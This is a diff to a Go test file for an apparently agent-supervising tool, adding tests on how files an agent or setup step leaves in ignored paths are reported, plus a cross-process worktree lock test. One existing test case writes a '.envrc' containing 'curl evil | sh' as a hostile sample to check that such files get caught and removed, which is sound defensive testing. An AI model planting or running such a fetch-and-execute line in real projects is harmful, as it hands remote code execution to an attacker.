@@ -3,6 +3,7 @@ package lastmile
 import (
 	"context"
 	"errors"
+	"fmt"
 	"os"
 	"path/filepath"
 	"slices"
@@ -11,9 +12,11 @@ import (
 	"testing"
 	"time"
 
+	"github.com/reneruck/sisyphus/internal/config"
 	"github.com/reneruck/sisyphus/internal/github"
 	"github.com/reneruck/sisyphus/internal/gittest"
 	"github.com/reneruck/sisyphus/internal/review"
+	"github.com/reneruck/sisyphus/internal/tracker"
 )
 
 func TestParseCheckURL(t *testing.T) {
@@ -83,6 +86,7 @@ func TestGlobAndProtected(t *testing.T) {
 type fakeTasks struct {
 	mu      sync.Mutex
 	calls   []review.Task
+	setup   func(dir string) // the container's setup, before AfterSetup
 	edit    func(dir string)
 	result  string
 	err     error
@@ -98,6 +102,12 @@ func (f *fakeTasks) RunTask(ctx context.Context, t review.Task) (review.TaskResu
 		case <-f.release:
 		case <-ctx.Done():
 			return review.TaskResult{}, ctx.Err()
+		}
+	}
+	if f.setup != nil {
+		f.setup(t.Worktree)
+		if err := t.AfterSetup(); err != nil {
+			return review.TaskResult{}, err
 		}
 	}
 	if f.edit != nil {
@@ -234,6 +244,16 @@ func TestFixAgentOutcomes(t *testing.T) {
 			os.WriteFile(filepath.Join(dir, ".git", "info", "exclude"), []byte(".envrc\n"), 0o644)
 			os.WriteFile(filepath.Join(dir, ".envrc"), []byte("curl evil | sh"), 0o644)
 		}}, nil, "gitignored files (new ones removed): .envrc", true},
+		{"setup writes ignored files", &fakeTasks{result: okFix, setup: func(dir string) {
+			os.WriteFile(filepath.Join(dir, ".git", "info", "exclude"), []byte("node_modules/\n"), 0o644)
+			write("node_modules/a/index.js", "x")(dir)
+		}}, nil, "agent made no changes", true},
+		{"many ignored files", &fakeTasks{result: okFix, edit: func(dir string) {
+			os.WriteFile(filepath.Join(dir, ".git", "info", "exclude"), []byte("node_modules/\n"), 0o644)
+			for i := range 25 {
+				write(fmt.Sprintf("node_modules/f%02d.js", i), "x")(dir)
+			}
+		}}, nil, "node_modules/f19.js and 5 more", true},
 		{"hook config", &fakeTasks{result: okFix, edit: write(".husky/pre-commit", "x")}, nil, "protected path: .husky/pre-commit", true},
 		{"allowed path", &fakeTasks{result: okFix, edit: write("go.sum", "x")}, func(m *Manager) { m.cfg.LastMile.AllowPaths = []string{"go.sum"} }, "", false},
 		{"bad json", &fakeTasks{result: `nope`}, nil, "result.json is not valid", false},
@@ -411,4 +431,55 @@ func TestAgentsNeedReviews(t *testing.T) {
 	if h := m.must(t, id); h.State != StateNeedsHuman || h.Reason != "agents need reviews enabled" {
 		t.Errorf("handoff = %+v", h)
 	}
+}
+
+func TestSetupFilesAreNotTheAgents(t *testing.T) {
+	tasks := &fakeTasks{result: okFix, setup: func(dir string) {
+		os.WriteFile(filepath.Join(dir, ".git", "info", "exclude"), []byte("node_modules/\n"), 0o644)
+		os.MkdirAll(filepath.Join(dir, "node_modules"), 0o755)
+		os.WriteFile(filepath.Join(dir, "node_modules", "a.js"), []byte("x"), 0o644)
+	}}
+	m, _, id, _ := redFixture(t, tasks)
+	m.tickWait(t)
+	m.tick(context.Background())
+	h := m.must(t, id)
+	if h.Reason != "agent made no changes" {
+		t.Fatalf("reason = %q", h.Reason)
+	}
+	if _, err := os.Stat(filepath.Join(h.Worktree, "node_modules", "a.js")); err != nil {
+		t.Fatalf("setup's file was removed: %v", err)
+	}
+}
+
+func TestWorktreeLockSpansManagers(t *testing.T) {
+	flockPoll = 10 * time.Millisecond
+	dir := t.TempDir()
+	newM := func() *Manager {
+		m, err := New(config.Config{}, &FakeGitHub{}, &tracker.Locks{}, dir)
+		if err != nil {
+			t.Fatal(err)
+		}
+		return m
+	}
+	a, b := newM(), newM() // two processes on one state dir
+	unlock, err := a.lockWorktree(context.Background(), "h1", "/wt")
+	if err != nil {
+		t.Fatal(err)
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
+	defer cancel()
+	if _, err := b.lockWorktree(ctx, "h1", "/wt"); err == nil {
+		t.Fatal("second manager got a held worktree lock")
+	}
+	if u, err := b.lockWorktree(context.Background(), "h2", "/other"); err != nil {
+		t.Fatalf("other worktree: %v", err)
+	} else {
+		u()
+	}
+	unlock()
+	u, err := b.lockWorktree(context.Background(), "h1", "/wt")
+	if err != nil {
+		t.Fatalf("after release: %v", err)
+	}
+	u()
 }
